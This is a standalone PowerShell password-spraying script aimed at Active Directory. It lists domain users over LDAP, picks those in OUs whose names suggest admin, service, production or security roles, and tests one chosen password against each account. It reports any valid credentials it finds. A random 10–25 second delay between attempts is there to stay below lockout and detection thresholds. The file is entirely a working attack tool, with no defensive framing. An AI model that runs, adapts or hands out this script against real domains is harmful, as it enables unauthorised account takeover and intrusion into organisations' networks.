
$PasswordToSpray = "" 
$InterestingOUKeywords = @("admin", "svc", "it", "prod", "ops", "sec", "service", "infra", "cloud")


$Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name
Write-Host "Detected Domain: $Domain" -ForegroundColor Cyan


$Context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', $Domain)


function Test-DomainCredential {
    param (
        [string]$Username,
        [string]$Password
    )
    try {
        return $Context.ValidateCredentials($Username, $Password)
    } catch {
        return $false
    }
}


$Searcher = New-Object System.DirectoryServices.DirectorySearcher
$Searcher.SearchRoot = "LDAP://$Domain"
$Searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
$Searcher.PageSize = 1000
$Results = $Searcher.FindAll()


$OUBuckets = @{}

foreach ($Result in $Results) {
    $User = $Result.Properties
    $SamAccountName = $User.samaccountname[0]
    $DistinguishedName = $User.distinguishedname[0]

    if (-not $SamAccountName -or $SamAccountName -like "*admin$") { continue }

    $OU = ($DistinguishedName -split ',CN=')[0]
    foreach ($Keyword in $InterestingOUKeywords) {
        if ($OU -match $Keyword) {
            if (-not $OUBuckets.ContainsKey($OU)) {
                $OUBuckets[$OU] = @()
            }
            $OUBuckets[$OU] += $SamAccountName
            break
        }
    }
}


Write-Host "Targeting OUs with these users:" -ForegroundColor Yellow
foreach ($OU in $OUBuckets.Keys) {
    Write-Host "`nOU: $OU" -ForegroundColor Green
    $OUBuckets[$OU] | ForEach-Object { Write-Host " $_" }
}


Write-Host "`nStarting password spray..." -ForegroundColor Cyan
foreach ($OU in $OUBuckets.Keys) {
    foreach ($User in $OUBuckets[$OU]) {
        $Valid = Test-DomainCredential -Username $User -Password $PasswordToSpray
        if ($Valid) {
            Write-Host "[+] Valid credentials: $User : $PasswordToSpray" -ForegroundColor Green
        } else {
            Write-Host "[-] Invalid: $User" -ForegroundColor DarkGray
        }
        Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 25) 
    }
}
